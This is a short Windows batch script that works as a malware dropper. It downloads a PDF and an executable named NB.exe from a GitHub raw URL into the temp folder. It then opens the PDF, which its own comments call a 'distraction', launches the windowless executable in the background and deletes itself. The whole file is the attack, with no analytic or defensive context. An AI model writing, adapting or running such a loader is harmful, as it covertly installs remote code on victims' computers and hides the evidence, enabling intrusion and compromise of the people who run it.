@echo off
cd %temp%

:: Download PDF and EXE
curl -o The_Book_of_Frogs.pdf https://raw.githubusercontent.com/2mwd2024/nb/main/The_Book_of_Frogs.pdf
curl -o NB.exe https://raw.githubusercontent.com/2mwd2024/nb/main/NB.exe

:: Open the PDF for distraction
start The_Book_of_Frogs.pdf

:: Run the EXE normally (since it has no window)
start NB.exe

:: Self-delete
del "%~f0"
exit
